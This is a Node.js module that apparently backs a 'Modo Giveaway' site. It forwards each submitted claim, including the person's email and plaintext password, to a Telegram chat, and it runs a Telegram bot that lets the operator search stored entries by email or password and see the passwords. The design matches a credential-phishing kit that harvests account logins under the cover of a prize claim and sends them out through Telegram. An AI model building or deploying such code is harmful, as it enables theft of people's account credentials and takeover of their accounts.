const path = require("node:path");
const fs = require("node:fs");

const envFile = path.join(__dirname, "..", ".env.local");
if (fs.existsSync(envFile)) {
  require("dotenv").config({ path: envFile, quiet: true });
}

const db = require("./db");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function escapeHtml(value) {
  return String(value ?? "").replace(
    /[&<>"']/g,
    (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c],
  );
}

async function sendMessage(chatId, text, opts = {}) {
  if (!BOT_TOKEN) return;
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", ...opts }),
  });
  if (!res.ok) {
    const detail = await res.text();
    console.warn("telegram sendMessage failed:", res.status, detail);
  }
}

async function sendClaimNotification({ id, name, email, password, claimCode }) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  const siteUrl = process.env.URL || "";
  const adminLink = siteUrl ? `${siteUrl}/admin` : "your admin panel";

  const text = [
    "🎁 New claim submitted",
    "──────────────",
    "✉️ Email: " + email,
    "🔑 Code: " + name,
    "🔒 Password: " + password,
    "🆔 Claim ID: " + claimCode,
    "──────────────",
    `📋 Review: ${adminLink}`,
  ].join("\n");

  try {
    await sendMessage(CHAT_ID, escapeHtml(text));
  } catch (err) {
    console.warn("telegram notify error:", err.message);
  }
}

const STATUS_LABEL = {
  pending: "Pending ⏳",
  approved: "Approved ✅",
  rejected: "Rejected ❌",
};

const KEYBOARD = {
  keyboard: [["🔍 Search recent", "❓ Help"]],
  resize_keyboard: true,
  one_time_keyboard: false,
};

function formatSearchResults(results, term) {
  if (!results.length) {
    return `No recent matches for <b>${escapeHtml(term)}</b>. Try an email or password.`;
  }
  const lines = ["<b>Recent matches:</b>"];
  results.forEach((r, i) => {
    lines.push(
      `${String(i + 1)}. <b>${escapeHtml(r.name)}</b>  (Claim ID <code>${escapeHtml(r.claim_code)}</code>)`,
      `   ✉️ ${escapeHtml(r.email)}`,
      `   🔒 ${escapeHtml(r.password)}`,
      `   ${STATUS_LABEL[r.status] ?? r.status}`,
    );
  });
  return lines.join("\n");
}

async function handleTelegramWebhook(body) {
  const message = body?.message;
  if (!message || message.text == null) return { ok: true };

  const chatId = message.chat.id;
  const text = String(message.text).trim();

  if (text === "/start" || text === "/help" || text === "❓ Help") {
    await sendMessage(
      chatId,
      [
        "<b>Modo Giveaway admin search</b>",
        "",
        "Tap <b>Search recent</b>, then send an <b>email</b> or <b>password</b> I'll check for.",
        "I'll reply with the most recent matching entries (up to 3).",
      ].join("\n"),
      { reply_markup: KEYBOARD },
    );
    return { ok: true };
  }

  if (text === "🔍 Search recent") {
    await sendMessage(
      chatId,
      "Send an <b>email</b> or <b>password</b> to look up recent entries.",
      { reply_markup: KEYBOARD },
    );
    return { ok: true };
  }

  try {
    const results = await db.searchRecentClaims(text, 3);
    await sendMessage(chatId, formatSearchResults(results, text), {
      reply_markup: KEYBOARD,
    });
  } catch (err) {
    await sendMessage(chatId, `Search failed: ${escapeHtml(err.message)}`, {
      reply_markup: KEYBOARD,
    });
  }

  return { ok: true };
}

module.exports = { sendClaimNotification, handleTelegramWebhook, sendMessage };